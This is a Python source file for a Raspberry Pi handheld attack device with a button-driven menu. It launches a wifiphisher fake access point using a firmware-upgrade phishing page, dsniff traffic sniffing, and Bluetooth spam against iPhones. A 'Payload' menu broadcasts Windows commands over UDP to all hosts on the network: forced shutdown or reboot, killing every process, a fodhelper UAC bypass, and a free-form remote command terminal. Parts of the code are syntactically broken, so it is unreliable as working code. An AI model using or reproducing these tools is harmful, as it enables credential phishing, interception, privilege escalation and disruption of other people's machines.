import RPi.GPIO as GPIO
import time
import os
import subprocess
import socket
import sys
from libs.mojstd import * # Mojito Standard Library 



# returner()
while True:
    draw_menu(selected_index)

    if GPIO.input(KEY_UP_PIN) == 0:
        selected_index = (selected_index - 1) % len(menu_options)
        draw_menu(selected_index)
        time.sleep(0.3)
    if GPIO.input(KEY_DOWN_PIN) == 0:
        selected_index = (selected_index + 1) % len(menu_options)
        draw_menu(selected_index)
        time.sleep(0.3)
    if GPIO.input(KEY_PRESS_PIN) == 0:
        selected_option = menu_options[selected_index]
        ui_print(f"Selected: {selected_option}", 1)

        if selected_option == "Networks":
            # Draw and handle the Network sub-menu
            sub_menu_options = ["Wifi", "Deauth", "Firewall"]
            sub_selected_index = 0

            while True:
                if bk():
                    break
                draw_sub_menu(sub_selected_index, sub_menu_options)

                if GPIO.input(KEY_UP_PIN) == 0:
                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_DOWN_PIN) == 0:
                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_PRESS_PIN) == 0:
                    sub_selected_option = sub_menu_options[sub_selected_index]
                    ui_print(f"Selected: {sub_selected_option}", 1)

                    if sub_selected_option == "Wifi":
                        sub_menu_options = ["Fake AP", "Sniff"]
                        sub_selected_index = 0

                        while True:
                            if bk():
                                break
                            draw_sub_menu(sub_selected_index, sub_menu_options)

                            if GPIO.input(KEY_UP_PIN) == 0:
                                sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                                draw_sub_menu(sub_selected_index, sub_menu_options)
                                time.sleep(0.3)
                            if GPIO.input(KEY_DOWN_PIN) == 0:
                                sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                                draw_sub_menu(sub_selected_index, sub_menu_options)
                                time.sleep(0.3)
                            if GPIO.input(KEY_PRESS_PIN) == 0:
                                sub_selected_option = sub_menu_options[sub_selected_index]
                                ui_print(f"Selected: {sub_selected_option}", 1)

                            if sub_selected_option == "Fake AP":
                                ui_print("Create a name for\n the fake AP", 3)
                                fakeAp = getinput()  # Prende il nome inserito dall'utente
                                # Esegui wifiphisher con il nome del fake AP
                                command = subprocess.run(
                                    ["sudo", "wifiphisher", "-i", "wlan0", "-e", f"{fakeAp}", "-p", "firmware-upgrade"],
                                    capture_output=True, text=True
                                )

                                # Mostra il risultato del comando
                                if command.returncode == 0:
                                    ui_print(f"Fake AP '{fakeAp}' created successfully", 3)
                                else:
                                    ui_print(f"Error: {command.stderr}", 3)

                                ui_print("Press joystick to stop", 3)

                                # Loop per aspettare che l'utente interrompa il processo
                                while True:
                                    ui_print(command.stdout, 1)  # Mostra output in tempo reale (facoltativo)
                                    if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
                                        break
                            if sub_menu_options == "Sniff":
                                    os.system("sudo ifconfig wlan0 down")
                                    os.system("sudo iwconfig wlan0 mode monitor")
                                    os.system("sudo airmon-ng start wlan0")
                                    os.system("sudo ifconfig wlan0 up")
                                    command = subprocess.run(
                                    ["sudo", "dsniff", "-i", "wlan0mon"],
                                    capture_output=True, text=True
                                    )
                                    while True:
                                        ui_print(command.stdout, 1)
                                        if GPIO.input(KEY_UP_PIN) == 0 or GPIO.input(KEY_DOWN_PIN) == 0 or GPIO.input(KEY_PRESS_PIN) == 0:
                                            break


    
                if GPIO.input(KEY_UP_PIN) == 0:
                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_DOWN_PIN) == 0:
                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_PRESS_PIN) == 0:
                    sub_selected_option = sub_menu_options[sub_selected_index]
                    ui_print(f"Selected: {sub_selected_option}", 1)

                    if sub_selected_option == "Join a Party":
                        ui_print("Select the party name", 3)
                        partyName = getinput()
                        ui_print("Select the password of party", 3)
                        partyPassword = getinput()
                        # Esegui il comando usando subprocess.run per ottenere l'output
                        result = subprocess.run(["sudo", "hamachi", "join", partyName, partyPassword], capture_output=True, text=True)
                        ui_print(result.stdout, 3)
                        time.sleep(1)
                    elif sub_selected_option == "Create a Party":
                        ui_print("Create a party name", 3)
                        CpartyName = getinput()
                        ui_print("Create a password", 3)
                        CpartyPassword = getinput()
                        # Esegui il comando usando subprocess.run per ottenere l'output
                        result = subprocess.run(["sudo", "hamachi", "create", CpartyName, CpartyPassword], capture_output=True, text=True)
                        ui_print(result.stdout, 3)
                        time.sleep(1)
                    elif sub_selected_option == "Login":
                        result = subprocess.run(["sudo", "login"], capture_output=True, text=True)
                        ui_print(result.stdout, 3)
                    elif sub_selected_option == "Leave Party":
                        ui_print("Write the party name\nto confirm leaving", 3)
                        LpartyName = getinput()
                        result = subprocess.run(["sudo", "hamachi", "leave", LpartyName,], capture_output=True, text=True)
                        ui_print(result.stdout, 3)


                    break  # Exit sub-menu to main menu

        elif selected_option == "Bluetooth":
            def run_bleddos():
                os.system("sudo bash bleddos.sh")
            sub_menu_options = ["Spam"]
            sub_selected_index = 0


            while True:
                if bk():
                    break
                draw_sub_menu(sub_selected_index, sub_menu_options)

                if GPIO.input(KEY_UP_PIN) == 0:
                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_DOWN_PIN) == 0:
                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_PRESS_PIN) == 0:
                    sub_selected_option = sub_menu_options[sub_selected_index]
                    ui_print(f"Selected: {sub_selected_option}", 1)




                    if sub_selected_option == "Spam":
                        sub_menu_options = ["iOS", "Exit"]
                        sub_selected_index = 0

                        while True:
                            if bk():
                                break
                            draw_sub_menu(sub_selected_index, sub_menu_options)

                            if GPIO.input(KEY_UP_PIN) == 0:
                                sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                                draw_sub_menu(sub_selected_index, sub_menu_options)
                                time.sleep(0.3)
                            if GPIO.input(KEY_DOWN_PIN) == 0:
                                sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                                draw_sub_menu(sub_selected_index, sub_menu_options)
                                time.sleep(0.3)
                            if GPIO.input(KEY_PRESS_PIN) == 0:
                                sub_selected_option = sub_menu_options[sub_selected_index]
                                ui_print(f"ì{sub_selected_option}", 1)

                                if sub_selected_option == "iOS":
                                    os.system("sudo python3 iphone.py")
                                    show_image("bkat.png", lambda: GPIO.input(KEY_PRESS_PIN) == 0)  # Show image until button press
                                    break






        elif selected_option == "App & Plugin":
            while True:
                if bk():
                    break
                else:
                    show_file_menu()









        elif selected_option == "Payload":


            def shutdownWin():
                """Invia un messaggio di shutdown a tutti gli utenti sulla rete."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'shutdown /s /f /t 0'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)

            def rebootWin():
                """Invia un messaggio di reboot a tutti gli utenti sulla rete."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'shutdown /r /f /t 0'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)

            def RickRoll():
                """Invia un link di Rick Roll a tutti gli utenti sulla rete."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'start https://www.youtube.com/watch?v=dQw4w9WgXcQ'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)

            def KillEmAll():
                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'powershell -Command "Get-Process | Where-Object { $_.Name -ne \'explorer\' } | ForEach-Object { $_.Kill() }"'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)

            def Crash():
                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'taskkill /F /FI "STATUS eq RUNNING"'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)

            def UACBypass():
                  
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                message = 'reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe'
                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                ui_print("Command Executed", 3)


            def Terminal():
                """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
                ui_print("Type 'Leave' for exit", 3)
                while True:
                    message = getinput()
                    if message == "Leave":
                        break
                    else:
                        sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                        ui_print("Command Executed", 1)

            def self_destruct():
                """Rimuove il file di script."""
                try:
                    file_path = sys.argv[0]  # Ottieni il percorso dello script corrente
                    os.remove(file_path)
                    ui_print("DESTROYED", 3)
                except Exception as e:
                    ui_print("--- ERROR --", 3)

            sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "UACBypass", "Cmd", "Exit"]
            sub_selected_index = 0


            while True:                        
                if bk():
                    break
                draw_sub_menu(sub_selected_index, sub_menu_options)

                if GPIO.input(KEY_UP_PIN) == 0:
                    sub_selected_index = (sub_selected_index - 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_DOWN_PIN) == 0:
                    sub_selected_index = (sub_selected_index + 1) % len(sub_menu_options)
                    draw_sub_menu(sub_selected_index, sub_menu_options)
                    time.sleep(0.3)
                if GPIO.input(KEY_PRESS_PIN) == 0:
                    sub_selected_option = sub_menu_options[sub_selected_index]
                    ui_print(f"Selected: {sub_selected_option}", 1)

                    if sub_selected_option == "Shutdown":
                        shutdownWin()

                    if sub_selected_option == "Reboot":
                        rebootWin()

                    if sub_selected_option == "RickRoll":
                        RickRoll()

                    if sub_selected_option == "Kill All Process":
                        KillEmAll() # Metallica Reference?!
                    if sub_selected_option == "UACBypass":
                        UACBypass() # Metallica Reference?!
                    if sub_selected_option == "Exit":
                        break

                    if sub_selected_option == "Terminal":
                        Terminal()
                    if sub_selected_option == "SELF DESTRUCTION":
                        ui_print("Type 'y' to confirm\nSELF DESTRUCTION", 3)
                        request = getinput()
                        if request == 'y':
                            self_destruct()
                            break
                        else:
                            ui_print("SELF DESTRUCTION STOPPED.", 3)
                            break



        elif selected_option == "Shutdown":
            ui_print("Shutting down...", 2)
            time.sleep(1)
            subprocess.call(['sudo', 'shutdown', '-h', 'now'])
        elif selected_option == "Reboot":
            os.system("sudo reboot")
        elif selected_option == "Restart MojUI":
            os.system("sudo python boot.py")
        else:
            ui_print("Unknown option", 2)



        elif selected_option == "Settings":
            selected_index = 0

            time.sleep(0.20)
            while True:
                menu_options = ["Interface", "Ssh"]
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY3_PIN) == 0:
                    ui_print("Retring...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Interface":
                        sys_class_net_ = subprocess.run(["ls", "/sys/class/net/"], text=True, capture_output=True)
                        if sys_class_net_.returncode != 0:
                            ui_print("""Error: Unable to find ANY 
    network interfaces""")

                        else:
                            interface = sys_class_net_.stdout.splitlines()

                            #interface menu
                            selected_index = 0
                            time.sleep(0.20)

                            while True:
                                menu_options = interface
                                draw_menu(selected_index)
                                if GPIO.input(KEY_UP_PIN) == 0:
                                    selected_index = (selected_index - 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY_DOWN_PIN) == 0:
                                    selected_index = (selected_index + 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY3_PIN) == 0:
                                    ui_print("Retring...", 0.5)
                                    break

                                elif GPIO.input(KEY_PRESS_PIN) == 0:
                                    selected_option = menu_options[selected_index]
                                    INTERFACE = {"interface":selected_option}
                                    ui_print("Wait please...", 0.5)
                                    with open("settings/settings.json", "w") as idk:
                                        json.dump(INTERFACE, idk, indent=2)
                                    ui_print(f"""Selected Interface:
{selected_option}""")

                                
                                




                    else:
                        break
